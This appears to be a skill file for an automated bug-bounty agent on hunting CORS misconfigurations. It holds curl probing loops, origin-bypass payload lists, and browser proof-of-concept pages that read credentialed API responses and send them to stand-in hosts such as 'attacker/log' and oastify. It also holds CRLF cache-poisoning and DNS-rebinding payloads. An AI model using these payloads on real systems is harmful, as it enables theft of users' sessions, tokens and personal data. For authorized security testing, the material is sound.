# Upstream source: cors (hunting)

Original path: `/tmp/h1res_MrPsycho04_Hunting-Agent/cors/SKILL.md`

---

---
name: cors
description: "Hunt CORS Misconfiguration — origin-reflection with credentials, null-origin trust, subdomain-regex bypass (unanchored vs unescaped-dot vs prefix-only), pre-flight (OPTIONS) gating bypass, postMessage origin checks. High only when an attacker-controlled origin can perform a CREDENTIALED cross-origin read of sensitive data and you have proven it in a browser. Use when testing API endpoints, SPAs, or any app emitting Access-Control-* headers."
---

# HUNT-CORS — Cross-Origin Resource Sharing Misconfiguration

## What actually pays (and what does not)

CORS pays High **only** when an attacker-controlled origin can perform a
**credentialed** cross-origin read of sensitive authenticated data, and you
have a browser PoC proving the response body is readable from `evil.com`.

Two hard browser rules that kill most "findings" — check these FIRST:

- **`Access-Control-Allow-Origin: *` CANNOT be combined with credentials.**
  If the server returns `ACAO: *`, the browser refuses to send/expose the
  response for a `credentials: include` request. A wildcard-only endpoint is
  **not** credential-exploitable. It is only interesting if the data it serves
  is sensitive *without* a session (rare) — usually this is Informational/Low.
- **`Access-Control-Allow-Credentials: true` is meaningless on its own.** It
  matters only if `ACAO` reflects/allows your specific attacker origin AND a
  cross-origin credentialed `fetch` actually returns a readable body. ACAC on a
  response that does not reflect your origin proves nothing.

If you cannot demonstrate a readable cross-origin authed body in a real
browser, you do not have a High. Do not submit header-diffing alone.

---

## Crown Jewel Targets

- **Reflect-any-origin + credentials** — server echoes the `Origin` header AND
  sets `ACAC: true` → any site reads authed API responses. The classic High.
- **Null-origin trust** — `ACAO: null` + `ACAC: true`. A `sandbox` iframe (or a
  `data:`/redirect chain) emits `Origin: null`, so any page can read authed data.
- **Subdomain-regex bypass** — trusted-origin regex with a parsing flaw. The
  correct payload depends on *which* flaw (see Phase 3 — this is where most
  skills get it wrong).
- **Subdomain takeover → trusted origin** — a dangling subdomain that the CORS
  policy trusts; take it over, host the PoC there (see subdomain-takeover).
- **postMessage missing/loose origin check** — handler that processes
  `event.data` without strictly validating `event.origin`.

---

## Attack Surface Signals

```
Any endpoint returning an Access-Control-Allow-Origin header
API endpoints:   /api/*, /v1/*, /graphql
Profile/account: /api/me, /api/profile, /api/user, /api/session
Secrets/tokens:  /api/tokens, /api/keys, /api/csrf, /api/account/settings
Financial:       /api/balance, /api/transactions
Admin/internal:  /api/admin/*, /api/internal/*
```

Prioritize endpoints that (a) require a session cookie and (b) return PII,
tokens, CSRF tokens, or other secrets in the body.

---

## Step-by-Step Hunting Methodology

### Phase 1 — Discover CORS endpoints
```bash
# Probe API endpoints. Use GET (not -I): some servers only emit CORS on GET,
# and -I sends HEAD which may be handled differently.
while read url; do
  result=$(curl -s -D - -o /dev/null "$url" \
    -H "Origin: https://evil.com" \
    -H "Cookie: $SESSION_COOKIE" | grep -i "access-control")
  [ -n "$result" ] && echo "=== $url ===" && echo "$result"
done < recon/$TARGET/api-endpoints.txt

# httpx bulk check
cat recon/$TARGET/live-hosts.txt | awk '{print $1}' | \
  httpx -H "Origin: https://evil.com" -match-string "access-control-allow-origin"
```

### Phase 2 — Reflect-any-origin + null origin
```bash
# Does the server reflect an arbitrary Origin back?
curl -s -D - -o /dev/null https://$TARGET/api/me \
  -H "Origin: https://evil.com" \
  -H "Cookie: $SESSION_COOKIE" | grep -i "access-control"

# Vulnerable (the High case):
#   Access-Control-Allow-Origin: https://evil.com   <- reflects attacker origin
#   Access-Control-Allow-Credentials: true          <- + credentials => readable
#
# NOT exploitable for credentialed theft:
#   Access-Control-Allow-Origin: *                   <- browser blocks creds read
#   (no ACAC, or ACAC absent)                        <- not credentialed

# Null-origin trust
curl -s -D - -o /dev/null https://$TARGET/api/me \
  -H "Origin: null" \
  -H "Cookie: $SESSION_COOKIE" | grep -i "access-control"
# Looking for:  Access-Control-Allow-Origin: null  +  ACAC: true
```

### Phase 3 — Subdomain / trusted-origin regex bypass
The right payload depends on **which** regex flaw the server has. Identify the
class first, then send the matching payload. Getting this wrong wastes the test
and produces false negatives.

| Server regex (intended: trust `*.target.com`) | Flaw | Bypass origin that matches | Why |
|---|---|---|---|
| `^https?://.*\.target\.com$` | **None** — escaped dot + end-anchor. Correct. | (no simple bypass) | `evil.target.com` is in-scope by design; `x.target.com.evil.com` ENDS in `.evil.com`, fails `$`. Move on or look for subdomain-takeover. |
| `^https?://.*target\.com$` | **Missing dot separator** (no `\.` before `target`) | `https://eviltarget.com` | `.*target\.com$` matches `eviltarget.com` — attacker registers `eviltarget.com`. |
| `^https?://.*\.target\.com` | **Missing end-anchor `$`** | `https://x.target.com.evil.com` | regex matches a prefix; `.target.com` appears, then `.evil.com` is ignored (no `$`). |
| `^https?://target\.com` | **Prefix-only, no `$`** | `https://target.com.evil.com` | matches the `target.com` prefix; the rest is unconstrained. |
| `^https?://.*\.target\.com$` but dot in regex is **unescaped** (`.*.target.com$`) | **Unescaped dot** = "any char" | `https://xtargetXcom...` style, or `https://evilZtargetZcom` where `Z` is any single char | `.` matches any character, widening the match. |
| Any of the above | **Special chars browsers send in Origin** | `https://target.com%60.evil.com`, `https://target.com\x60evil.com` | some parsers treat backtick/underscore as letters; Safari/older browsers may emit unusual origins. Confirm the browser actually sends it. |

```bash
# Send each class-specific payload and watch what the server reflects.
for ORIGIN in \
  "https://evil.target.com" \
  "https://eviltarget.com" \
  "https://x.target.com.evil.com" \
  "https://target.com.evil.com" \
  "https://target.com%60.evil.com" \
  "http://target.com"; do
  RESULT=$(curl -s -D - -o /dev/null "https://$TARGET/api/me" \
    -H "Origin: $ORIGIN" \
    -H "Cookie: $SESSION_COOKIE" | grep -i "access-control")
  echo "[$ORIGIN] -> ${RESULT:-no CORS}"
done
```
A bypass is real only if the server reflects **your registerable origin** into
`ACAO` with `ACAC: true`. `evil.target.com` reflecting back is NOT a bug unless
you can actually control a `*.target.com` host (then see Phase 6 / subdomain-takeover).

### Phase 3b — Trusted insecure (HTTP) origin
If ACAO reflects/allows any `http://` origin (even a correctly-anchored in-scope one) with ACAC:true, a network attacker on that cleartext host injects a page that reads the authed cross-origin body — no regex flaw needed, the plaintext scheme IS the flaw.
```bash
curl -s -D- -o/dev/null "https://$TARGET/api/me" -H "Origin: http://sub.$TARGET" -H "Cookie: $SESSION" | grep -i access-control
```
Real only if a MITM can occupy that http origin (no HSTS-preload). Pair with `tls-network`. (PortSwigger: CORS with trusted insecure protocols.)

### Phase 4 — Pre-flight (OPTIONS) gating bypass
Non-simple requests (custom headers, `PUT`/`DELETE`/`PATCH`, non-simple
`Content-Type`) trigger a CORS **pre-flight** `OPTIONS`. The browser only sends
the real request if the pre-flight response authorizes the method/header. Two
things to test:

1. **Does the pre-flight authorize arbitrary methods/headers for your origin?**
   If `Access-Control-Allow-Methods` / `Access-Control-Allow-Headers` reflect
   whatever you ask for, a malicious origin can drive state-changing requests
   (chain to CSRF-style writes that JSON/SameSite would otherwise block).

```bash
curl -s -D - -o /dev/null -X OPTIONS "https://$TARGET/api/account/email" \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: PUT" \
  -H "Access-Control-Request-Headers: x-custom-auth, content-type" \
  | grep -i "access-control"
# Vulnerable: ACAO reflects evil.com + ACAC:true +
#   Access-Control-Allow-Methods: PUT  +  Access-Control-Allow-Headers: x-custom-auth
# => attacker origin can issue authed PUT/DELETE with custom headers.
```

2. **Is the pre-flight even enforced server-side?** Some servers reflect the
   origin on `OPTIONS` but the actual GET/POST also reflects — the read path is
   the bug; the pre-flight just confirms write-path reach. Test the GET/POST
   directly too — never assume the pre-flight result equals the real-request
   result. Confirm in a browser, because curl ignores CORS entirely.

### Phase 5 — Browser PoCs (the only thing that proves impact)
curl does NOT enforce CORS — it will happily show you a reflected header even
when a browser would block the read. **Every CORS High needs a browser PoC.**

**5a. Reflect-any-origin read** (host on evil.com, open while logged into target):
```html
<!doctype html><body><pre id="out"></pre>
<script>
fetch("https://TARGET/api/me", {credentials: "include"})
  .then(r => r.text())
  .then(d => {
    document.getElementById("out").innerText = d;        // prove readable body
    // OOB proof: fetch("https://OOB-ID.oastify.com/?d="+encodeURIComponent(d));
  })
  .catch(e => document.getElementById("out").innerText = "BLOCKED: " + e);
</script></body>
```
If you see `BLOCKED` / a TypeError, the browser refused the read — it is NOT a
valid finding regardless of what curl showed (this is the `ACAO: *` + creds case).

**5b. Null-origin read** — a `sandbox` iframe sends `Origin: null`. The inner
document must lack `allow-same-origin` so its origin is opaque (`null`):
```html
<!doctype html><body>
<!-- Outer page hosted anywhere -->
<iframe sandbox="allow-scripts" srcdoc='
  <script>
    fetch("https://TARGET/api/me", {credentials: "include"})
      .then(r => r.text())
      .then(d => parent.postMessage(d, "*"));
  &lt;/script&gt;'></iframe>
<script>
window.addEventListener("message", e => {
  // d is the authed body, read cross-origin via a null Origin
  // fetch("https://OOB-ID.oastify.com/?d="+encodeURIComponent(e.data));
  console.log("NULL-ORIGIN READ:", e.data);
});
</script></body>
```
(Alternative null-origin emitters: a `data:` / `blob:` document, or bouncing the
request through a 302 redirect chain whose final hop is cross-scheme.)

**5c. Trusted-subdomain read** — once you control a host that the regex trusts
(real subdomain via takeover, or a registerable origin that matches a buggy
regex from Phase 3), host **5a** there. The reflected origin is now an origin
you legitimately serve, so the browser allows the read.

### Phase 6 — postMessage origin check
```bash
# Find message handlers that don't strictly validate event.origin.
grep -rEn "addEventListener\(['\"]message" recon/$TARGET/ --include="*.js" \
  | grep -v "\.origin"
# Then audit each hit: does it check event.origin against an allowlist
# BEFORE using event.data? Weak checks to flag:
#   .indexOf("target.com") > -1      <- "target.com.evil.com" passes
#   .endsWith("target.com")          <- "eviltarget.com" passes
#   startsWith("https://target")     <- "https://target.evil.com" passes
#   no check at all
```
postMessage is a separate class from HTTP CORS — impact is DOM-side (XSS,
client-side auth bypass). See dom for exploitation depth.

---

## Automation (triage only — never the proof)
```bash
# corsy — fast reflection/null/pre-domain checks
pip3 install corsy
corsy -u https://$TARGET -t 10 --headers "Cookie: $SESSION_COOKIE"

# nuclei CORS templates
nuclei -u https://$TARGET -t http/misconfiguration/cors/

# Burp: passively flags origin reflection; always re-confirm in a real browser.
```
Every automated hit is a lead, not a finding. Reproduce 5a/5b in a browser.

---

## Chain Table

| CORS finding | Chain to | Impact |
|---|---|---|
| Reflects attacker origin + creds | Browser-read `/api/me`, `/api/tokens`, `/api/csrf` | PII + token + CSRF-token theft → often ATO |
| Reflects origin + reads CSRF token | csrf: steal token → forge state change | CSRF on CSRF-protected forms |
| Pre-flight allows arbitrary method/header | Drive authed `PUT`/`DELETE` from evil origin | Cross-origin state change |
| Trusted subdomain has XSS | xss → run 5a from trusted origin | Reliable credentialed read |
| Dangling trusted subdomain | subdomain-takeover takeover → host 5c there | Full credentialed read |
| postMessage no/loose origin check | dom: inject iframe, send crafted message | DOM XSS / client auth bypass |

---

## Validation discipline (read before submitting)

- **Browser proof mandatory.** curl reflecting a header is NOT exploitation.
  Show a screenshot/console log of the authed body read from `evil.com`. If the
  fetch throws / logs `BLOCKED`, you have nothing.
- **`ACAO: *` + credentials = not a finding.** Browsers block it. Only pursue
  wildcard if the data is sensitive unauthenticated (then it is usually Low).
- **`ACAC: true` alone proves nothing** — it must pair with your reflected
  origin AND a successful readable cross-origin body.
- **Match the regex class to the payload (Phase 3).** Do not submit
  `target.com.evil.com` against an end-anchored escaped-dot regex — it does not
  match and is not a bug.
- **`evil.target.com` reflecting is not automatically a bug** — it is an
  in-scope subdomain by design unless you can actually control it.
- **OOB confirmation** for blind/headless contexts: exfil the read body to a
  Burp Collaborator / oastify host and show the interaction. Use a unique
  per-test marker so the hit is unambiguously yours.
- **Sensitive data requirement.** A readable `/api/health` is not High. Tie the
  read to PII, tokens, secrets, or financial data to justify severity.

**Severity:**
- Reflects attacker origin + creds + sensitive body, browser-proven: High
- Pre-flight authorizes attacker-origin state change on sensitive action: High
- Null-origin + sensitive authed body, browser-proven: Medium–High
- Subdomain-takeover/XSS-assisted credentialed read: High/Critical
- Reflects origin, no credentials / non-sensitive: Low–Informational
- `ACAO: *` only (no creds possible): Informational unless data is secret

## Web-Research Methodology Additions (2026)

### A. Discovery checklist — concrete places, params, headers, infra signals to look
- Any response with `Access-Control-*` headers but no explicit origin is a strong hint that ACAO is generated from the request `Origin`. Some apps emit CORS headers *only* when an Origin is present — always add `Origin:` before concluding "no CORS."
- Test five origin classes against authenticated endpoints: (1) arbitrary `https://evil.com`, (2) `null`, (3) subdomain/prefix/suffix variants, (4) HTTP instead of HTTPS and port variants, (5) special-character/underscore/backtick hostnames.
- The exploitability gate is BOTH `Access-Control-Allow-Origin` reflecting your test origin AND `Access-Control-Allow-Credentials: true`. `ACAO: *` plus `ACAC: true` is blocked by browsers — a non-finding for credentialed theft. `ACAO: null` without credentials is usually low impact (see network-position exception below).
- Check for missing `Vary: Origin` on dynamically generated ACAO. It enables client-side and server-side cache poisoning: a reflected-header XSS (`X-User-id`, `Origin` with `\r`) can be cached and later rendered on a direct navigation.
- Probe preflight (`OPTIONS` with `Origin`, `Access-Control-Request-Method`, `Access-Control-Request-Headers`) on APIs that use PUT/DELETE/custom auth headers — a permissive preflight means the attacker origin can issue authenticated state changes, not just reads.
- Look for the "context-dependent trust" case: the app doesn't trust itself but trusts related domains/subdomains. A dangling CNAME in a trusted subdomain then becomes a CORS read primitive (cross-reference subdomain-takeover).
- Check for Private Network Access behavior: `Access-Control-Request-Private-Network: true` in preflight, `Access-Control-Allow-Private-Network: true` in response. Chrome's PNA rollout has been in flux — test both the compliant flow and the "incomplete enforcement" behavior; `0.0.0.0` and public-IP-from-LAN quirks are version-dependent.
- Inventory adjacent primitives that bypass CORS entirely: JSONP/`callback` params (XSSI), CORS-escape proxies (no victim credentials), and origin checks inside postMessage handlers.

### B. Techniques & bypasses — specific actionable techniques/payload shapes
- Origin reflection — the classic PoC (sends victim cookies, exfiltrates body):
  ```
  GET /accountDetails HTTP/1.1
  Host: target
  Origin: https://evil.com
  Cookie: session=...
  ```
  ```
  var req = new XMLHttpRequest();
  req.onload = () => location='//attacker/log?key='+this.responseText;
  req.open('get','https://target/accountDetails',true);
  req.withCredentials = true; req.send();
  ```
- Null origin — obtainable by any site via sandboxed iframe:
  ```
  <iframe sandbox="allow-scripts allow-top-navigation allow-forms"
   srcdoc="<script>...xhr withCredentials=true ... location='https://attacker/log?key='+encodeURIComponent(this.responseText)</script>"></iframe>
  ```
  Also reachable from `data:` / `file:` contexts.
- Regex/allowlist bypasses (PortSwigger URL-validation cheat sheet payload families):
  - trusted string as substring: `https://target.evil.com`, `https://eviltarget.com`, `https://target.com.attacker.com`
  - Chrome/Firefox accept underscores: `Origin: https://target.application_.arbitrary.com`
  - Safari accepts `}`/backtick: `https://example.com}.attacker.com/`, `https://example.com`.attacker.com/`
  - startswith checks: `https://target.evil.com`, `https://target@evil.com`
  - loopback normalizations: `127.1`, `0`, `0x7f000001`, IPv6 forms when localhost/metadata is string-blocked.
- Trusted insecure protocol: application over HTTPS but ACAO reflects `http://target.evil.com` -> active MITM bypasses HTTPS; HSTS/Secure cookies do not help.
- XSS on a whitelisted subdomain: if `*.requester.com` is trusted and `sub.requester.com` has XSS, run the CORS script from that subdomain to read `provider.com`.
- Server-side cache poisoning via Origin CRLF (IE/Edge treat `\r` as header terminator):
  ```
  GET / HTTP/1.1
  Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
  ```
  A server-side cache may store the split response and serve a UTF-7 XSS to others.
- Client-side cache poisoning without `Vary: Origin`: send a custom header reflected into HTML (`X-User-id: <svg/onload=alert(1)>`) with `withCredentials`, then navigate the browser to the URL so the cached response renders.
- Non-credentialed but still impactful: use the victim's browser as a proxy to bypass IP auth for intranet apps (similar to DNS rebinding but simpler). DNS-rebinding variants (first-then-second, multiple A records, TTL expiry, DoH, CNAME-to-internal) also defeat IP/origin checks.
- `callback`/JSONP parameter: if data comes back as `application/javascript`, `<script>` inclusion reads it despite CORS.

### C. Validation / proof bar — how to confirm and avoid false positives
- Header reflection alone is not impact. Prove a browser can read victim-specific data: deliver the PoC to a logged-in test victim and show their API key/CSRF token/PII in your server log. A logged response in Burp is not enough.
- Always confirm `ACAC: true` plus a non-wildcard ACAO. Without credentials, the finding is usually Low/Informational unless network position (intranet) or a token-in-URL is involved.
- Avoid the classic false positive: `ACAO: *` with `ACAC: true` is invalid per spec and browsers refuse credentialed reads — do not report it as CORS theft.
- Re-run the exact PoC twice and confirm reproducibility; note any browser-specific requirement (Safari backtick payloads, IE/Edge CRLF) so triage uses the right browser.
- Check cache behavior explicitly: if you claim cache poisoning, show the cached response being served on a clean request without the malicious header, and verify `Vary: Origin` is absent.
- For preflight findings, show an actual authenticated state-changing cross-origin request succeeding (not just reflective headers on OPTIONS).
- Defensive framing: replace dynamic reflection with an exact-match allowlist, never whitelist `null`, never allow HTTP origins on an HTTPS app, add `Vary: Origin`, and remember CORS is not a substitute for server-side authorization.

### D. Sources — numbered list of URLs you actually fetched
1. https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties
2. https://hacktricks.wiki/en/pentesting-web/cors-bypass.html
3. https://portswigger.net/web-security/cors
4. https://portswigger.net/research/introducing-the-url-validation-bypass-cheat-sheet
5. https://portswigger.net/research/new-crazy-payloads-in-the-url-validation-bypass-cheat-sheet
6. https://www.vaadata.com/en/blog/understanding-and-preventing-cors-misconfiguration
7. https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-cors-misconfiguration-vulnerabilities
